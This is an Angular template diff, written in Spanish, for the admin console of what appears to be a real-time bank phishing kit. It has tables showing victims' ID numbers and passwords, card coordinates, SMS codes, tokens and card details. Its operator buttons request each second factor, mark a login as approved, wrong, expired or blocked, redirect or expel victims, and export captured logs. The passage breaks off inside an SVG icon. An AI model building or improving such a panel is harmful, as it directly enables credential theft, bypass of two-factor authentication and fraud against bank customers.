@@ -1,0 +1,1702 @@
+<div class="kbapp-root">
+  <div *ngIf="!showlogin">
+    <div>
+      <div class="todo-submit">
+        <!-- <div style="font-size: 18px;" (click)="getAll()"> -->
+        <div style="font-size: 18px; margin-bottom: 5px">ADMIN</div>
+        <!-- <div style="margin-top: 5px !important;" class="custom-control custom-switch">
+                    <input *ngIf="isStatus" (change)="currentState($event, true)" type="checkbox" class="custom-control-input" id="customSwitches" checked />
+                    <label *ngIf="isStatus" class="custom-control-label" for="customSwitches"></label>
+
+                    <input *ngIf="!isStatus" (change)="currentState($event, false)" type="checkbox" class="custom-control-input" id="customSwitches2" />
+                    <label *ngIf="!isStatus" class="custom-control-label" for="customSwitches2"></label>
+                </div> -->
+        <!-- <div>
+                    <input type="checkbox" id="checkbox-1-1" class="regular-checkbox" /><label for="checkbox-1-1"></label>
+                </div> -->
+        <div>
+          <!-- <div class="tag">Checkbox Big</div> -->
+          <input
+            *ngIf="isServerOnline"
+            type="checkbox"
+            (change)="currentState($event, false)"
+            id="checkbox-2-1"
+            class="regular-checkbox big-checkbox"
+            checked
+          />
+          <input
+            *ngIf="!isServerOnline"
+            type="checkbox"
+            (change)="currentState($event, true)"
+            id="checkbox-2-1"
+            class="regular-checkbox big-checkbox"
+          />
+          <label for="checkbox-2-1"></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- <div
+      style="max-width: 150px; text-align: center; margin: 0 auto"
+      class="container"
+    >
+      <button
+        *ngIf="!isLoadingLoading"
+        (click)="update()"
+        style="margin: 10px"
+        class="msd-button msd-button--secondary"
+      >
+        Actualizar
+      </button>
+
+      <button
+        *ngIf="isLoadingLoading"
+        class="msd-button msd-button--secondary topLoading"
+      >
+        <img
+          src="/assets/img/Dual Ring-1s-200px.svg"
+          width="50"
+          alt=""
+          srcset=""
+        />
+      </button>
+    </div> -->
+
+    <div style="width: 96%; display: flex; justify-content: flex-end">
+      <button
+        *ngIf="!isLoadingLoading"
+        (click)="update()"
+        style="margin: 10px"
+        class="msd-button msd-button--secondary"
+      >
+        Actualizar
+      </button>
+      <button
+        *ngIf="!isLoadingLoading"
+        (click)="this.requestPassword = true"
+        style="margin: 10px"
+        class="msd-button msd-button--secondary"
+      >
+        Ver Logos
+      </button>
+    </div>
+
+    <div class="table-responsive">
+      <table class="table table-striped">
+        <thead>
+          <tr>
+            <!-- <th class="text-center">NOMBRE</th> -->
+            <th class="text-center">LOGIN</th>
+            <th class="text-center">CORDE</th>
+            <th class="text-center">SMS</th>
+            <th class="text-center">TOKEN</th>
+            <th class="text-center">TARJETA</th>
+            <th class="text-center">ESTADO</th>
+            <!-- background-color: #dc3545 -->
+            <th class="text-center" style="color: #dc3545">ACCIONES</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr
+            *ngFor="
+              let user of usersV
+                | paginate
+                  : { itemsPerPage: 50, currentPage: 1, totalItems: 100 };
+              index as i
+            "
+          >
+            <input
+              class="{{ user.userId }}"
+              id="{{ i }}"
+              type=""
+              value=""
+              hidden
+            />
+
+            <!-- NOMBRE -->
+            <!-- <td class="text-center kb-p-25">
+              {{
+                user.name === "Indefinido"
+                  ? "------"
+                  : user.name.split(" ")[0].toUpperCase()
+              }}
+            </td> -->
+
+            <!-- LOGIN -->
+            <td class="text-center kb-p-25">
+              {{ user.rut }}
+              <br />
+              {{ user.password }}
+            </td>
+
+            <!-- CORDE -->
+            <td class="text-center kb-p-12">
+              {{
+                user.digicard !== "---"
+                  ? user.digicard.split(" ")[0]
+                  : user.digicard
+              }}
+              <br />
+              {{
+                user.digicard !== "---"
+                  ? user.digicard.split(" ")[1]
+                  : user.digicard
+              }}
+              <br />
+              {{
+                user.digicard !== "---"
+                  ? user.digicard.split(" ")[2]
+                  : user.digicard
+              }}
+            </td>
+
+            <!-- SMS -->
+            <td class="text-center kb-p-25">
+              {{ user.smsmobil }}
+            </td>
+
+            <!-- TOKEN -->
+            <td class="text-center kb-p-25">
+              <!-- <span class="badge badge-success">NUEVO</span> -->
+              {{ user.token }}
+            </td>
+
+            <!-- TARJETA -->
+            <td class="text-center kb-p-12">
+              <!-- {{ user.card }} -->
+              {{
+                user.card !== "---"
+                  ? user.card.split(":")[1].split(" ")[0]
+                  : user.card
+              }}
+              <br />
+              {{
+                user.card !== "---"
+                  ? user.card.split(":")[2].split(" ")[0]
+                  : user.card
+              }}
+              <br />
+              {{ user.card !== "---" ? user.card.split(":")[3] : user.card }}
+            </td>
+
+            <!-- ESTADO -->
+            <td class="text-center kb-p-25" id="console{{ i }}">
+              <!-- {{ user.active ? "ON" : "OFF" }} -->
+              <!-- {{ currentWaiting.toLowerCase() }} -->
+            </td>
+
+            <!-- ACCIONES -->
+            <!-- style="padding: 10px 0px" -->
+            <td class="text-center">
+              <div *ngIf="!user.showOpts">
+                <div class="row-actions">
+                  <button
+                    class="msd-button msd-button--secondary kbmargin"
+                    (click)="
+                      requestLogin(
+                        'login',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    LOGIN
+                  </button>
+                </div>
+              </div>
+
+              <div *ngIf="user.showOpts">
+                <div class="row-actions">
+                  <button
+                    class="msd-button msd-button--primary kbmargin"
+                    (click)="
+                      requestCoors(
+                        'digicard',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    Coors
+                  </button>
+
+                  <button
+                    class="msd-button msd-button--primary kbmargin"
+                    (click)="
+                      requestCard(
+                        'card',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    Tarjeta
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin"
+                    (click)="
+                      requestSms(
+                        'smsmobil',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    SMS
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin"
+                    (click)="
+                      requestToken(
+                        'token',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    Token
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin"
+                    (click)="
+                      requestBEpass(
+                        'bepass',
+                        user,
+                        i,
+                        user.userId,
+                        user.rut,
+                        user.active
+                      )
+                    "
+                  >
+                    BEpass
+                  </button>
+                </div>
+
+                <div class="row-actions">
+                  <button
+                    class="msd-button msd-button--primary kbmargin success"
+                    (click)="
+                      confirmModal('finish', user, i, user.userId, user.rut)
+                    "
+                  >
+                    Finalizar
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin redired"
+                    (click)="
+                      confirmModal('redired', user, i, user.userId, user.rut)
+                    "
+                  >
+                    Redirigir
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin redired"
+                    (click)="
+                      confirmModal('noAutorize', user, i, user.userId, user.rut)
+                    "
+                  >
+                    Expulsar
+                  </button>
+                  <button
+                    class="msd-button msd-button--primary kbmargin redired"
+                    (click)="confirmRemoveUser(user)"
+                  >
+                    Borrar
+                  </button>
+                </div>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- NUEVOOOO -->
+
+    <!-- <div class="grid-container">
+      <div class="flex-container">
+        <div>
+          <h1>Nombre</h1>
+        </div>
+
+        <div>
+          <h1>Apellido</h1>
+        </div>
+      </div>
+
+      <div class="grid-item">1</div>
+      <div class="grid-item">2</div>
+      <div class="grid-item">3</div>
+      <div class="grid-item">4</div>
+      <div class="grid-item">5</div>
+      <div class="grid-item">6</div>
+      <div class="grid-item">7</div>
+      <div class="grid-item">8</div>
+      <div class="grid-item">9</div>
+    </div> -->
+
+    <!-- AQUI LA TABLET -->
+
+    <!-- NUEVOOOO -->
+  </div>
+
+  <!-- MODAL CONFIRM -->
+  <div *ngIf="modalConfirm" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="this.modalConfirm = false"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div *ngIf="!isLoadingLoading" style="margin-top: 10px">
+            <h4 style="color: red">{{ modalConfirmText }}</h4>
+          </div>
+
+          <div
+            *ngIf="isLoadingLoading"
+            class=""
+            style="text-align: center !important; margin: auto !important"
+          >
+            <div
+              style="margin-top: 5px !important; margin-bottom: 25px !important"
+            >
+              <div class="lds-dual-ring"></div>
+              <p id="aja">Por favor espere...</p>
+            </div>
+          </div>
+
+          <div
+            *ngIf="!isLoadingLoading"
+            _ngcontent-fcw-c107=""
+            class="msd-time-out-content__footer"
+          >
+            <button
+              (click)="sendAction()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--primary success"
+            >
+              SI
+            </button>
+            <button
+              (click)="this.modalConfirm = false"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--primary danger"
+            >
+              NO
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- MODAL CONFIRM -->
+
+  <!-- MODAL CONFIRM REMOVE USER-->
+  <div *ngIf="modalConfirmRemoveUser" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="this.modalConfirmRemoveUser = false"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div *ngIf="!isLoadingLoading" style="margin-top: 10px">
+            <h4 style="color: red">{{ modalConfirmRemoveUserText }}</h4>
+          </div>
+
+          <div
+            *ngIf="isLoadingLoading"
+            class=""
+            style="text-align: center !important; margin: auto !important"
+          >
+            <div
+              style="margin-top: 5px !important; margin-bottom: 25px !important"
+            >
+              <div class="lds-dual-ring"></div>
+              <p id="aja">Por favor espere...</p>
+            </div>
+          </div>
+
+          <div
+            *ngIf="!isLoadingLoading"
+            _ngcontent-fcw-c107=""
+            class="msd-time-out-content__footer"
+          >
+            <button
+              (click)="removeUser()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--primary success"
+            >
+              SI
+            </button>
+            <button
+              (click)="this.modalConfirmRemoveUser = false"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--primary danger"
+            >
+              NO
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- MODAL CONFIRM REMOVE USER -->
+
+  <!-- SHOW LOGIN -->
+  <div *ngIf="showlogin" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div style="margin-top: 10px">
+            <h4>LOGIN</h4>
+          </div>
+
+          <div _ngcontent-iyu-c73="" style="max-width: 230px" class="kbcenter">
+            <div class="input-bech-label">
+              <input
+                _ngcontent-iyu-c73=""
+                type="text"
+                autocomplete="off"
+                autofocus=""
+                name="user"
+                placeholder="Usuario"
+                [(ngModel)]="userLogin.username"
+                class="ng-untouched ng-pristine ng-invalid"
+                [disabled]="isLoadingLoading"
+              />
+
+              <div
+                *ngIf="isUsernameError"
+                _ngcontent-apo-c73=""
+                tabindex="0"
+                role="none"
+                class="info-text--error"
+              >
+                Usuario Invalido.
+              </div>
+            </div>
+
+            <div class="input-bech-label">
+              <input
+                _ngcontent-iyu-c73=""
+                type="text"
+                autocomplete="off"
+                name="name"
+                placeholder="*****"
+                [(ngModel)]="userLogin.password"
+                class="ng-untouched ng-pristine ng-invalid kbproject"
+                [disabled]="isLoadingLoading"
+              />
+
+              <div
+                *ngIf="isPasswordError"
+                _ngcontent-apo-c73=""
+                class="info-text--error"
+              >
+                <span
+                  _ngcontent-apo-c73=""
+                  id="userError_1"
+                  tabindex="0"
+                  role="none"
+                  >Clave Invalida.</span
+                >
+              </div>
+            </div>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              *ngIf="!isLoadingLoading"
+              (click)="login()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--secondary"
+            >
+              ENTRAR
+            </button>
+            <img
+              *ngIf="isLoadingLoading"
+              src="/assets/img/Dual Ring-1s-200px.svg"
+              width="60"
+              alt=""
+              srcset=""
+            />
+            <!-- <img *ngIf="isLoadingLoading" src="/assets/img/JdxVluJ.gif" class="text-center" width="40" height="40" /> -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- SHOW LOGIN -->
+
+  <!-- SHOW SOUND ALERT -->
+  <div *ngIf="!showlogin && showAlert" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div style="width: 100px; height: 100px; margin: auto">
+            <img src="/assets/img/campana.png" width="100" alt="" srcset="" />
+          </div>
+
+          <div
+            style="margin-top: 10px"
+            _ngcontent-fcw-c107=""
+            class="msd-time-out-content__footer"
+          >
+            <button
+              (click)="disabledAlert()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--secondary"
+            >
+              ESCUCHAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- SHOW SOUND ALERT -->
+
+  <!-- REQUEST PASSWORD -->
+  <div *ngIf="requestPassword" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="this.requestPassword = false"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>CLAVE ADMIN</h4>
+          </div>
+
+          <div _ngcontent-iyu-c73="" style="max-width: 230px" class="kbcenter">
+            <div class="input-bech-label">
+              <input
+                _ngcontent-iyu-c73=""
+                type="text"
+                autocomplete="off"
+                name="name"
+                placeholder="*****"
+                [(ngModel)]="userLogin.password"
+                class="ng-untouched ng-pristine ng-invalid kbproject"
+                [disabled]="isLoadingLoading"
+              />
+              <div
+                *ngIf="isPasswordError"
+                _ngcontent-apo-c73=""
+                class="info-text--error"
+              >
+                <span
+                  _ngcontent-apo-c73=""
+                  id="userError_1"
+                  tabindex="0"
+                  role="none"
+                  >Clave Invalida.</span
+                >
+              </div>
+            </div>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              *ngIf="!isLoadingLoading"
+              (click)="getAll()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--secondary"
+            >
+              VER LOGOS
+            </button>
+            <img
+              *ngIf="isLoadingLoading"
+              src="/assets/img/JdxVluJ.gif"
+              class="text-center"
+              width="40"
+              height="40"
+            />
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- REQUEST PASSWORD -->
+
+  <!-- SHOW LOGS -->
+  <div *ngIf="showLogs" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-log-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-log-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-log-content"
+        >
+          <div
+            (click)="hideLogsModal()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div
+            *ngIf="!showLogsLoading"
+            _ngcontent-fcw-c107=""
+            class="msd-time-out-content__footer"
+          >
+            <button
+              *ngIf="isLogsResult"
+              (click)="downloadAll()"
+              _ngcontent-fcw-c107=""
+              msdsecondary=""
+              class="msd-button msd-button--primary"
+            >
+              Exportar Todos
+            </button>
+            <button
+              *ngIf="!isLogsResult"
+              type="button"
+              class="btn btn-warning"
+              disabled
+            >
+              Exportar Todos
+            </button>
+
+            <button
+              *ngIf="isLogsResult"
+              (click)="deleteLogs()"
+              _ngcontent-fcw-c107=""
+              msdprimary=""
+              class="msd-button msd-button--primary danger"
+            >
+              Eliminar Todos
+            </button>
+            <button
+              *ngIf="!isLogsResult"
+              type="button"
+              class="btn btn-danger"
+              disabled
+            >
+              Eliminar Todos
+            </button>
+
+            <div style="margin-top: 10px">
+              <hr />
+            </div>
+          </div>
+
+          <div class="kb-modal-dialog">
+            <div class="modal-body">
+              <div *ngIf="showLogsLoading">
+                <div class="lds-dual-ring"></div>
+              </div>
+
+              <div *ngIf="!showLogsLoading && isLogsResult">
+                <div *ngFor="let log of totalLogsV; let i = index">
+                  <pre
+                    style="
+                      margin-bottom: 10px !important;
+                      min-height: 200px;
+                      font-size: 17px !important;
+                    "
+                  ><div style="text-align: left !important;">
+<label>RUT     :   <label>{{log.rut}}</label></label>
+<label>CLAVE   :   <label>{{log.password}}</label></label>
+<label>NOMBRE  :   <label>{{isMobil ? log.name.substr(0,19) : log.name}}</label></label>
+            
+<label>ESTADO  :  <span [ngClass]="{'badge-success': log.active}" style="min-width: 135px;" class="badge badge-danger">{{log.active ? 'EN LINEA' : 'DESCOCNETADO'}}</span></label>
+            
+<label>SMSMOBIL:  <span [ngClass]="{'badge-success': log.smsmobil != 'ESPERANDO'}" style="min-width: 135px;" class="badge badge-warning">{{log.smsmobil}}</span></label>
+<label>DIGICARD:  <span [ngClass]="{'badge-success': log.digicard != 'ESPERANDO'}" style="min-width: 135px;" class="badge badge-warning">{{log.digicard}}</span></label>
+<label >TOKEN   :  <span [ngClass]="{'badge-success': log.token != 'ESPERANDO'}" style="min-width: 135px" class="badge badge-warning">{{log.token}}</span></label>
+<label >TARJETA :  <span [ngClass]="{'badge-success': log.card != 'ESPERANDO'}" style="min-width: 135px" class="badge badge-warning">{{log.card}}</span></label>
+<label>FECHA   :  <label>{{isMobil ? log.date.substr(0,10) : log.date}}</label></label>
+</div></pre>
+                </div>
+              </div>
+
+              <div *ngIf="!showLogsLoading && !isLogsResult">
+                <h1>No se encontraron logos</h1>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- SHOW LOGS -->
+
+  <!-- EVENTO INICIO DE SESION -->
+  <div *ngIf="loginEventModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestLogin()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>INICIO DE SESION</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestLoginExe(true, '')"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary kbmb"
+            >
+              APROBADO
+            </button>
+            <button
+              (click)="requestLoginExe(false, 'error')"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary danger kbmb"
+            >
+              CLAVE ERRONEA
+            </button>
+            <button
+              (click)="requestLoginExe(false, 'caducada')"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary danger kbmb"
+            >
+              CLAVE CADUCADA
+            </button>
+            <button
+              (click)="requestLoginExe(false, 'bloqueada')"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary danger kbmb"
+            >
+              CLAVE BLOQUEADA
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO INICIO DE SESION -->
+
+  <!-- OPCIONES CREDITOS -->
+  <div *ngIf="optCreditModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestOptCredit()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>SEGURO QUE QUIERES ENVIAR LAS OPCIONES DE CREDITO ?</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestOptCreditExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              ENVIAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- OPCIONES CREDITOS -->
+
+  <!-- OPCIONES PAGOS -->
+  <div *ngIf="optPayModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestOptPay()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>SEGURO QUE QUIERES ENVIAR LAS OPCIONES DE PAGO ?</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestOptPayExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              ENVIAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- OPCIONES CREDITOS -->
+
+  <!-- EVENTO CARD -->
+  <div *ngIf="cardModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestCard()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
